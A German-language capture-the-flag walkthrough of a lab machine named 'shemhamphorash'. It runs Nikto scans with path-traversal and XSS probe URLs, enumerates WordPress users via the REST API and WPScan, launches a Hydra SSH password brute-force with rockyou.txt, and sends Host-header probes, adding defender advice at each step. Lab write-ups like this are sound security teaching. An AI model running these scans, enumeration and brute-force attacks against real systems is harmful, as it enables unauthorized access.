+ /admin.php/3rdparty/phpMyAdmin/db_details_importdocsql.php?submit_show=true&amp;do=import&amp;docpath=../: <span class="password">phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher.</span> See: [Link: https://seclists.org/fulldisclosure/2003/Jun/536 | Ziel: https://seclists.org/fulldisclosure/2003/Jun/536]
+ /admin.php/phpMyAdmin/db_details_importdocsql.php?submit_show=true&amp;do=import&amp;docpath=../: <span class="password">phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher.</span> See: [Link: https://seclists.org/fulldisclosure/2003/Jun/536 | Ziel: https://seclists.org/fulldisclosure/2003/Jun/536]
+ /admin.php/3rdparty/phpmyadmin/db_details_importdocsql.php?submit_show=true&amp;do=import&amp;docpath=../: <span class="password">phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher.</span> See: [Link: https://seclists.org/fulldisclosure/2003/Jun/536 | Ziel: https://seclists.org/fulldisclosure/2003/Jun/536]
+ /admin.php/phpmyadmin/db_details_importdocsql.php?submit_show=true&amp;do=import&amp;docpath=../: <span class="password">phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher.</span> See: [Link: https://seclists.org/fulldisclosure/2003/Jun/536 | Ziel: https://seclists.org/fulldisclosure/2003/Jun/536]
+ /admin.php/pma/db_details_importdocsql.php?submit_show=true&amp;do=import&amp;docpath=../: <span class="password">phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher.</span> See: [Link: https://seclists.org/fulldisclosure/2003/Jun/536 | Ziel: https://seclists.org/fulldisclosure/2003/Jun/536]
+ /admin.php/.tools/phpMyAdmin/current/db_details_importdocsql.php?submit_show=true&amp;do=import&amp;docpath=../: <span class="password">phpMyAdmin allows directory listings remotely. Upgrade to version 2.5.3 or higher.</span> See: [Link: https://seclists.org/fulldisclosure/2003/Jun/536 | Ziel: https://seclists.org/fulldisclosure/2003/Jun/536]
+ /admin.php/openautoclassifieds/friendmail.php?listing=&lt;script&gt;alert(document.domain);&lt;/script&gt;: <span class="password">OpenAutoClassifieds 1.0 is vulnerable to a XSS attack.</span> See: [Link: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1145 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1145]
+ 7961 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2025-05-26 22:35:54 (GMT2) (38 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Nikto wird nun spezifisch gegen <code>http://shemhamphorash.hmv:8080/admin.php</code> ausgeführt.
Die Ergebnisse sind hier deutlich interessanter:
    Wieder fehlende Security-Header (<code>X-Frame-Options</code>, <code>X-Content-Type-Options</code>).
    Mehrere Treffer für phpMyAdmin-Installationen (oder Überbleibsel davon) unter verschiedenen Pfaden (<code>3rdparty/phpMyAdmin</code>, <code>phpMyAdmin</code>, <code>pma</code>, <code>.tools/phpMyAdmin</code>). Diese scheinen eine alte Schwachstelle (Directory Listing, CVE von 2003) aufzuweisen, die das Auflisten von Verzeichnissen über einen manipulierten <code>docpath</code>-Parameter ermöglicht.
    Ein Treffer für OpenAutoClassifieds 1.0 mit einer Cross-Site Scripting (XSS) Schwachstelle (CVE-2003-1145) über den <code>listing</code>-Parameter in <code>friendmail.php</code>. Auch dies ist eine sehr alte Schwachstelle.</p>
<p class="evaluation"><strong>Bewertung:</strong> Die Funde deuten darauf hin, dass <code>admin.php</code> möglicherweise eine Art Sammelsurium alter oder schlecht konfigurierter Admin-Tools oder Skripte ist. Die phpMyAdmin-Funde und die XSS-Schwachstelle in OpenAutoClassifieds sind vielversprechend, auch wenn sie sehr alt sind. Auf schlecht gewarteten Systemen können solche alten Schwachstellen immer noch existieren und ausnutzbar sein.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die URLs für phpMyAdmin und OpenAutoClassifieds manuell im Browser prüfen und versuchen, die gemeldeten Schwachstellen (Directory Listing, XSS) auszunutzen. Auch wenn die CVEs alt sind, ist ein Test unabdingbar.
<br><strong>Empfehlung (Admin):</strong> Unnötige oder veraltete Softwarekomponenten (wie die angedeuteten phpMyAdmin-Versionen oder OpenAutoClassifieds) sollten dringend entfernt werden. Wenn phpMyAdmin benötigt wird, muss es auf die aktuellste Version aktualisiert und ordnungsgemäß abgesichert werden (Zugriffskontrolle, kein öffentlicher Zugriff auf Setup-Skripte). Alle Webanwendungen sollten regelmäßig auf XSS und andere Schwachstellen geprüft werden.</p>

<div class="code-block">
    <div class="terminal">
        <pre>
browser: http://shemhamphorash.local/sitecore/wp-login.php?redirect_to=http%3A%2F%2Fshemhamphorash.hmv%2Fsitecore%2Fwp-admin%2Findex.php&amp;reauth=1

Seite wurde nicht gefunden

Die Verbindung mit dem Server shemhamphorash.local schlug fehl.

Wenn Sie die richtige Adresse eingegeben haben, können Sie Folgendes tun:

    Versuchen Sie es später erneut.
    Überprüfen Sie Ihre Netzwerkverbindung.
    Überprüfen Sie, ob Firefox die Berechtigung hat, auf das Internet zuzugreifen (Sie sind möglicherweise verbunden, aber hinter einer Firewall).</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Es wird versucht, im Browser auf eine URL zuzugreifen, die auf einen WordPress-Login (<code>wp-login.php</code>) im Unterverzeichnis <code>/sitecore/</code> des Hosts <code>shemhamphorash.local</code> hindeutet. Der Versuch schlägt fehl, da der Hostname <code>shemhamphorash.local</code> noch nicht auf die IP-Adresse des Ziels aufgelöst wird.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies ist ein typisches Szenario, wenn man versucht, virtuelle Hosts oder spezifische Webanwendungen zu erreichen, ohne dass der entsprechende Hostname in der lokalen <code>hosts</code>-Datei oder im DNS konfiguriert ist. Der Name <code>shemhamphorash.local</code> und das Verzeichnis <code>/sitecore/</code> deuten stark auf eine weitere Webanwendung hin, möglicherweise WordPress.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Hostnamen <code>shemhamphorash.local</code> zur lokalen <code>/etc/hosts</code>-Datei hinzufügen und den Zugriff erneut versuchen.
<br><strong>Empfehlung (Admin):</strong> Sicherstellen, dass alle produktiven Hostnamen korrekt über DNS auflösbar sind. Interne oder Test-Hostnamen sollten nicht leicht von außen erratbar sein oder auf produktive IPs zeigen, es sei denn, dies ist beabsichtigt und gesichert.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">vi /etc/hosts</span></div>
        <pre>                192.168.2.202   shemhamphorash.hmv shemhamphorash.local</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Die lokale <code>/etc/hosts</code>-Datei wird erneut bearbeitet. Diesmal wird der Hostname <code>shemhamphorash.local</code> ebenfalls der IP-Adresse <code>192.168.2.202</code> zugeordnet. Nun werden Anfragen an <code>shemhamphorash.hmv</code> und <code>shemhamphorash.local</code> beide zur selben IP-Adresse geleitet.</p>
<p class="evaluation"><strong>Bewertung:</strong> Korrekter Schritt, um auf die zuvor identifizierte, aber nicht erreichbare WordPress-Instanz unter <code>shemhamphorash.local</code> zugreifen zu können.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nachdem die Hosts-Datei aktualisiert wurde, sollte der Zugriff auf <code>http://shemhamphorash.local/sitecore/</code> erneut versucht werden.
<br><strong>Empfehlung (Admin):</strong> Wie zuvor, DNS für die Namensauflösung verwenden und die Sicherheit von virtuellen Hosts und spezifischen Anwendungspfaden gewährleisten.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl http://shemhamphorash.local/sitecore/index.php/wp-json//WP/V2/Users/1 | jq</span></div>
        <pre>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   835  100   835    0     0  32659      0 --:--:-- --:--:-- --:--:-- 33400
{
  "id": 1,
  "name": <span class="password">"trumpeter"</span>,
  "url": "http://shemhamphorash.local/sitecore",
  "description": "",
  "link": "http://shemhamphorash.local/sitecore/index.php/author/trumpeter/",
  "slug": "trumpeter",
  "avatar_urls": {
    "24": "https://secure.gravatar.com/avatar/4166d055a98a76239312bbe214e42bbd1d159c4c70ebb974e304437afd33ad0b?s=24&amp;d=mm&amp;r=g",
    "48": "https://secure.gravatar.com/avatar/4166d055a98a76239312bbe214e42bbd1d159c4c70ebb974e304437afd33ad0b?s=48&amp;d=mm&amp;r=g",
    "96": "https://secure.gravatar.com/avatar/4166d055a98a76239312bbe214e42bbd1d159c4c70ebb974e304437afd33ad0b?s=96&amp;d=mm&amp;r=g"
  },
  "meta": [],
  "_links": {
    "self": [
      {
        "href": "http://shemhamphorash.local/sitecore/index.php/wp-json/wp/v2/users/1",
        "targetHints": {
          "allow": [
            "GET"
          ]
        }
      }
    ],
    "collection": [
      {
        "href": "http://shemhamphorash.local/sitecore/index.php/wp-json/wp/v2/users"
      }
    ]
  }
}
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Mit <code>curl</code> wird die WordPress REST API abgefragt, um Informationen über den Benutzer mit der ID 1 zu erhalten. Die URL <code>/sitecore/index.php/wp-json/WP/V2/Users/1</code> ist der Endpunkt dafür. Die Ausgabe wird durch <code>jq</code> geleitet, um das JSON-Format menschenlesbar zu formatieren.
Die API gibt erfolgreich Informationen über den Benutzer mit ID 1 zurück, dessen Name (<code>name</code>) und Slug <code>trumpeter</code> ist.</p>
<p class="evaluation"><strong>Bewertung:</strong> Die WordPress REST API kann, wenn nicht richtig konfiguriert, sensible Informationen wie Benutzernamen preisgeben. Hier wurde der Benutzername <code>trumpeter</code> erfolgreich enumeriert. Dies ist ein wichtiger Fund für mögliche Brute-Force-Angriffe auf den Login.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den enumerierten Benutzernamen <code>trumpeter</code> für Passwortangriffe (z.B. mit Hydra oder WPScan) verwenden. Versuchen, weitere Benutzer-IDs (2, 3, etc.) abzufragen.
<br><strong>Empfehlung (Admin):</strong> Den Zugriff auf die WordPress REST API einschränken, insbesondere auf die Benutzer-Endpunkte, wenn diese nicht öffentlich benötigt werden. Dies kann durch Plugins oder Webserver-Konfigurationen (z.B. <code>.htaccess</code>) geschehen. Regelmäßig prüfen, welche Informationen öffentlich über die API zugänglich sind.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl http://shemhamphorash.local/sitecore/index.php/wp-json//WP/V2/Users/2 | jq</span></div>
        <pre>
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   108  100   108    0     0   4419      0 --:--:-- --:--:-- --:--:--  4500
{
  "code": "rest_user_cannot_view",
  "message": "Sorry, you are not allowed to list users.",
  "data": {
    "status": 401
  }
}
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Es wird versucht, Informationen über den WordPress-Benutzer mit der ID 2 über die REST API abzufragen. Diesmal schlägt die Anfrage mit dem Status 401 (Unauthorized) und der Meldung "Sorry, you are not allowed to list users." fehl. Der doppelte Slash <code>//</code> in der URL <code>/wp-json//WP/V2/Users/2</code> ist unüblich, wird aber von vielen Webservern toleriert und als einzelner Slash interpretiert.</p>
<p class="evaluation"><strong>Bewertung:</strong> Dies deutet darauf hin, dass entweder der Benutzer mit ID 2 nicht existiert, oder (wahrscheinlicher) dass die Berechtigungen so gesetzt sind, dass anonyme Benutzer nicht auf alle Benutzerinformationen zugreifen können, sondern möglicherweise nur auf den Administrator (oft ID 1) oder Benutzer, die öffentlich Inhalte gepostet haben.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Obwohl dieser spezifische Request fehlschlug, ist die User-Enumeration über die REST API nicht vollständig ausgeschlossen. Andere Endpunkte oder Techniken könnten weiterhin funktionieren. WPScan ist ein spezialisiertes Tool, das hier bessere Ergebnisse liefern könnte.
<br><strong>Empfehlung (Admin):</strong> Die Konfiguration der REST API bleibt wichtig. Es ist gut, dass nicht alle Benutzerinformationen öffentlich sind, aber eine generelle Härtung der API ist ratsam.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">wpscan --url http://shemhamphorash.local/sitecore --api-token ...  --enumerate ap,u --plugins-detection aggressive</span></div>
        <pre>
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.28
       Sponsored by Automattic - [Link: https://automattic.com/ | Ziel: https://automattic.com/]
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
 
[+] URL: http://shemhamphorash.local/sitecore/ [192.168.2.202]
[+] Started: Mon May 26 22:54:24 2025

Interesting Finding(s):

[+] Headers
 | Interesting Entry: <span class="command">Server: Apache/2.4.53 (Debian)</span>
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: <span class="command">http://shemhamphorash.local/sitecore/xmlrpc.php</span>
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - [Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/]
 |  - [Link: https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/]
 |  - [Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/]
 |  - [Link: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/ | Ziel: https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/]

[+] WordPress readme found: <span class="command">http://shemhamphorash.local/sitecore/readme.html</span>
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: <span class="command">http://shemhamphorash.local/sitecore/wp-content/uploads/</span>
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: <span class="command">http://shemhamphorash.local/sitecore/wp-cron.php</span>
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - [Link: https://www.iplocation.net/defend-wordpress-from-ddos | Ziel: https://www.iplocation.net/defend-wordpress-from-ddos]
 |  - [Link: https://github.com/wpscanteam/wpscan/issues/1299 | Ziel: https://github.com/wpscanteam/wpscan/issues/1299]

Fingerprinting the version - Time: 00:00:03 &lt;=============&gt; (702 / 702) 100.00% Time: 00:00:03
[i] The WordPress version could not be detected.

[+] WordPress theme in use: <span class="command">twentytwentytwo</span>
 | Location: http://shemhamphorash.local/sitecore/wp-content/themes/twentytwentytwo/
 | Last Updated: 2025-04-15T00:00:00.000Z
 | Readme: http://shemhamphorash.local/sitecore/wp-content/themes/twentytwentytwo/readme.txt
 | <span class="password">[!] The version is out of date, the latest version is 2.0</span>
 | Style URL: http://shemhamphorash.local/sitecore/wp-content/themes/twentytwentytwo/style.css?ver=1.1
 | Style Name: Twenty Twenty-Two
 | Style URI: [Link: https://wordpress.org/themes/twentytwentytwo/ | Ziel: https://wordpress.org/themes/twentytwentytwo/]
 | Description: Built on a solidly designed foundation, Twenty Twenty-Two embraces the idea that everyone deserves a...
 | Author: the WordPress team
 | Author URI: [Link: https://wordpress.org/ | Ziel: https://wordpress.org/]
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: <span class="command">1.1</span> (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://shemhamphorash.local/sitecore/wp-content/themes/twentytwentytwo/style.css?ver=1.1, Match: 'Version: 1.1'

[+] Enumerating All Plugins (via Aggressive Methods)
 Checking Known Locations - Time: 00:01:31 &lt;========&gt; (106918 / 106918) 100.00% Time: 00:01:31
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] <span class="command">akismet</span>
 | Location: http://shemhamphorash.local/sitecore/wp-content/plugins/akismet/
 | Last Updated: 2025-05-07T16:30:00.000Z
 | Readme: http://shemhamphorash.local/sitecore/wp-content/plugins/akismet/readme.txt
 | <span class="password">[!] The version is out of date, the latest version is 5.4</span>
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://shemhamphorash.local/sitecore/wp-content/plugins/akismet/, status: 200
 |
 | Version: <span class="command">4.2.2</span> (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://shemhamphorash.local/sitecore/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://shemhamphorash.local/sitecore/wp-content/plugins/akismet/readme.txt

[+] <span class="command">easy-cookies-policy</span>
 | Location: http://shemhamphorash.local/sitecore/wp-content/plugins/easy-cookies-policy/
 | Latest Version: 1.6.2 (up to date)
 | Last Updated: 2021-02-11T12:05:00.000Z
 | Readme: http://shemhamphorash.local/sitecore/wp-content/plugins/easy-cookies-policy/README.txt
 | <span class="password">[!] Directory listing is enabled</span>
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://shemhamphorash.local/sitecore/wp-content/plugins/easy-cookies-policy/, status: 200
 |
 | <span class="password">[!] 1 vulnerability identified:</span>
 |
 | <span class="password">[!] Title: Easy Cookie Policy &lt;= 1.6.2 - Broken Access Control to Stored Cross-Site Scripting</span>
 |     References:
 |      - [Link: https://wpscan.com/vulnerability/9157d6d2-4bda-4fcd-8192-363a63a51ff5 | Ziel: https://wpscan.com/vulnerability/9157d6d2-4bda-4fcd-8192-363a63a51ff5]
 |      - [Link: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24405 | Ziel: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24405]
 |
 | Version: <span class="command">1.6.2</span> (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://shemhamphorash.local/sitecore/wp-content/plugins/easy-cookies-policy/README.txt

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 &lt;================&gt; (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] <span class="password">trumpeter</span>
 | Found By: Rss Generator (Passive Detection)
 | Confirmed By:
 |  Wp Json Api (Aggressive Detection)
 |   - http://shemhamphorash.local/sitecore/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] <span class="password">blessed</span>
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)


[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 3
 | Requests Remaining: 22

[+] Finished: Mon May 26 22:56:17 2025
[+] Requests Done: 108256
[+] Cached Requests: 17
[+] Data Sent: 32.467 MB
[+] Data Received: 44.583 MB
[+] Memory used: 463.688 MB
[+] Elapsed time: 00:01:52
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> WPScan, ein spezialisierter WordPress-Schwachstellenscanner, wird gegen <code>http://shemhamphorash.local/sitecore</code> eingesetzt.
<code>--api-token ...</code>: (Der Token wurde hier unkenntlich gemacht) Ein API-Token für die WPScan Vulnerability Database, um aktuelle Schwachstelleninformationen abzurufen.
<code>--enumerate ap,u</code>: Enumeriert alle Plugins (<code>ap</code>) und Benutzer (<code>u</code>).
<code>--plugins-detection aggressive</code>: Verwendet aggressive Methoden zur Plugin-Erkennung.
Wichtige Funde:
    Bestätigung des Apache-Servers und des aktivierten XML-RPC.
    <code>readme.html</code> und WP-Cron sind zugänglich.
    Upload-Verzeichnis (<code>wp-content/uploads/</code>) hat Directory Listing aktiviert.
    Die WordPress-Version konnte nicht eindeutig bestimmt werden.
    Das Theme "twentytwentytwo" Version 1.1 ist veraltet (aktuell wäre 2.0).
    Plugin "akismet" Version 4.2.2 ist veraltet (aktuell wäre 5.4).
    Plugin "easy-cookies-policy" Version 1.6.2 ist installiert. Es hat Directory Listing aktiviert und eine bekannte Schwachstelle: **"Easy Cookie Policy &lt;= 1.6.2 - Broken Access Control to Stored Cross-Site Scripting (CVE-2021-24405)"**. Dies ist ein sehr wichtiger Fund!
    Zwei Benutzernamen wurden enumeriert: <code>trumpeter</code> (bestätigt den vorherigen Fund) und <code>blessed</code>.</p>
<p class="evaluation"><strong>Bewertung:</strong> WPScan liefert eine Fülle an kritischen Informationen. Die veralteten Versionen von Theme und Akismet-Plugin stellen potenzielle Risiken dar. Die herausragendste Entdeckung ist die bekannte XSS-Schwachstelle im Plugin "easy-cookies-policy". Die Enumeration der Benutzernamen <code>trumpeter</code> und <code>blessed</code> liefert Angriffsziele für Passwort-Brute-Force-Versuche.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die XSS-Schwachstelle in "easy-cookies-policy" (CVE-2021-24405) sollte priorisiert und versucht werden auszunutzen. Die Benutzernamen <code>trumpeter</code> und <code>blessed</code> für Passwort-Cracking-Versuche verwenden (z.B. über XML-RPC oder den Login-Bereich). Das Upload-Verzeichnis mit Directory Listing untersuchen.
<br><strong>Empfehlung (Admin):</strong> WordPress-Core, Themes und alle Plugins dringend auf die neuesten Versionen aktualisieren. Das Plugin "easy-cookies-policy" sofort aktualisieren oder, falls nicht mehr unterstützt/benötigt, deaktivieren und entfernen. Directory Listing für alle Verzeichnisse deaktivieren. XML-RPC deaktivieren, falls nicht zwingend erforderlich. Benutzerenumeration erschweren (z.B. durch Anpassungen an der REST API oder Sicherheitsplugins).</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">hydra -l trumpeter -P /usr/share/wordlists/rockyou.txt ssh://192.168.2.202 -s 22222 -t 64</span></div>
        <pre>
Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-26 22:47:19
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344489 login tries (l:1/p:14344489), ~224133 tries per task
[DATA] attacking ssh://192.168.2.202:22222/
[STATUS] 498.00 tries/min, 498 tries in 00:01h, 14344026 to do in 480:04h, 29 active
[STATUS] 482.00 tries/min, 1446 tries in 00:03h, 14343078 to do in 495:58h, 29 active
[STATUS] 472.71 tries/min, 3309 tries in 00:07h, 14341215 to do in 505:39h, 29 active
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Hydra wird verwendet, um einen Brute-Force-Angriff auf den SSH-Dienst (Port 22222) für den Benutzer <code>trumpeter</code> durchzuführen.
<code>-l trumpeter</code>: Gibt den Benutzernamen an.
<code>-P /usr/share/wordlists/rockyou.txt</code>: Verwendet die bekannte Passwortliste <code>rockyou.txt</code>.
<code>ssh://192.168.2.202</code>: Definiert das Ziel und das Protokoll.
<code>-s 22222</code>: Gibt den SSH-Port an.
<code>-t 64</code>: Verwendet 64 parallele Tasks. Hydra gibt eine Warnung aus, dass dies für SSH zu viele sein könnten.
Der Angriff wurde nach einigen Minuten manuell mit Strg+C abgebrochen. Es wurde kein Passwort gefunden in dieser Zeit.</p>
<p class="evaluation"><strong>Bewertung:</strong> Der Versuch, SSH-Zugangsdaten zu bruteforcen, ist ein gängiger Schritt. Die Wahl von <code>rockyou.txt</code> ist Standard. Die hohe Anzahl an Tasks (<code>-t 64</code>) kann bei SSH zu Problemen führen (z.B. temporäre Sperrung durch Fail2Ban oder Überlastung des SSH-Dienstes). Der Abbruch des Angriffs deutet darauf hin, dass er entweder zu lange dauerte oder andere Angriffsvektoren vielversprechender erschienen.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bei SSH-Brute-Force-Angriffen die Anzahl der Tasks (<code>-t</code>) reduzieren (z.B. auf 4 oder 8), um die Stabilität zu erhöhen und Abwehrmechanismen nicht zu schnell auszulösen. Längere Laufzeiten einplanen oder spezifischere Wortlisten verwenden, falls vorhanden.
<br><strong>Empfehlung (Admin):</strong> Mechanismen wie Fail2Ban implementieren, um Brute-Force-Angriffe auf SSH zu erkennen und zu blockieren. Starke, einzigartige Passwörter erzwingen und schlüsselbasierte Authentifizierung bevorzugen. SSH-Zugriff auf bestimmte IP-Adressen beschränken, falls möglich.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -H "Host: shemhamphorash.local" http://192.168.2.202:8080/admin.php -v</span></div>
        <pre>
*   Trying 192.168.2.202:8080...
* Connected to 192.168.2.202 (192.168.2.202) port 8080
* using HTTP/1.x
&gt; GET /admin.php HTTP/1.1
&gt; Host: shemhamphorash.local
&gt; User-Agent: curl/8.13.0
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Server: nginx/1.18.0
&lt; Date: Mon, 26 May 2025 20:55:30 GMT
&lt; Content-Type: text/html; charset=UTF-8
&lt; Transfer-Encoding: chunked
&lt; Connection: keep-alive
&lt; 
* Connection #0 to host 192.168.2.202 left intact
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Eine <code>curl</code>-Anfrage wird an <code>http://192.168.2.202:8080/admin.php</code> gesendet. Wichtig ist hier der zusätzliche Header <code>-H "Host: shemhamphorash.local"</code>. Dies ist ein Versuch, auf den Nginx-Server auf Port 8080 zuzugreifen, ihm aber vorzugaukeln, dass die Anfrage an den virtuellen Host <code>shemhamphorash.local</code> gerichtet ist (der eigentlich auf Port 80 durch Apache bedient wird, gemäß <code>/etc/hosts</code>).
Der Server antwortet mit HTTP 200 OK, liefert aber keinen sichtbaren Inhalt (<code>Transfer-Encoding: chunked</code>, aber keine Daten im verbose output von curl). Dies deckt sich mit der früheren Dirb-Ausgabe, die für <code>admin.php</code> ebenfalls SIZE:0 meldete.</p>
<p class="evaluation"><strong>Bewertung:</strong> Der Versuch, virtuelle Hosts zu testen, ist gut. Dass Nginx (Port 8080) mit 200 OK auf eine Anfrage mit dem Host-Header <code>shemhamphorash.local</code> antwortet, obwohl dieser Hostname für den Apache auf Port 80 konfiguriert wurde, ist interessant. Es könnte bedeuten, dass Nginx als Reverse Proxy für Apache fungiert oder dass die vHost-Konfiguration auf Nginx nicht strikt ist. Die fehlende Inhaltsausgabe bleibt ein Rätsel.</p>
<p class="recommendation"><strong>Empfehlung (Pentester):</strong> Weiter untersuchen, wie Nginx auf Port 8080 konfiguriert ist. Gibt es vielleicht spezifische Pfade oder Parameter, die Inhalt liefern? Den Host-Header testweise auch auf <code>shemhamphorash.hmv</code> oder die IP-Adresse setzen, um das Verhalten zu vergleichen.
<br><strong>Empfehlung (Admin):</strong> Die Konfiguration von Reverse Proxies und virtuellen Hosts sorgfältig prüfen. Sicherstellen, dass Anfragen korrekt weitergeleitet werden und keine unerwarteten Host-Header-Kombinationen zu Informationslecks oder Fehlverhalten führen. Der Zugriff auf administrative Skripte sollte immer authentifiziert sein.</p>

<div class="code-block">
    <div class="terminal">
        <div class="prompt">┌──(root㉿CCat)-[~]
└─# <span class="command">curl -H "Host: shemhamphorash.local" http://192.168.2.202:8080/info.php -v</span></div>
        <pre>
*   Trying 192.168.2.202:8080...
* Connected to 192.168.2.202 (192.168.2.202) port 8080
* using HTTP/1.x
&gt; GET /info.php HTTP/1.1
&gt; Host: shemhamphorash.local
&gt; User-Agent: curl/8.13.0
&gt; Accept: */*
&gt; 
* Request completely sent off
&lt; HTTP/1.1 200 OK
&lt; Server: nginx/1.18.0
&lt; Date: Mon, 26 May 2025 20:55:50 GMT
&lt; Content-Type: text/html; charset=UTF-8
&lt; Transfer-Encoding: chunked
&lt; Connection: keep-alive
&lt; 
* Connection #0 to host 192.168.2.202 left intact
</pre>
    </div>
</div>
<p class="analysis"><strong>Analyse:</strong> Ähnlich wie zuvor wird <code>curl</code> verwendet, um <code>info.php</code> auf Port 8080 mit dem Host-Header <code>shemhamphorash.local</code> abzufragen. Wieder antwortet der Nginx-Server mit 200 OK, aber es wird kein Inhalt angezeigt. Dies ist besonders relevant, da <code>info.php</code> oder <code>phpinfo.php</code> typischerweise PHP-Konfigurationsdetails ausgeben, was ein erhebliches Informationsleck darstellen würde.</p>
<p class="evaluation"><strong>Bewertung:</strong> Das Verhalten ist konsistent mit <code>admin.php</code>. Die Tatsache, dass <code>phpinfo.php</code> (oder ein Äquivalent <code>info.php</code>) zwar existiert (Status 200), aber keinen Inhalt liefert, ist merkwürdig. Es könnte sein, dass die Ausgabe serverseitig unterdrückt wird oder nur unter bestimmten Bedingungen erfolgt (z.B. Zugriff von localhost).</p>
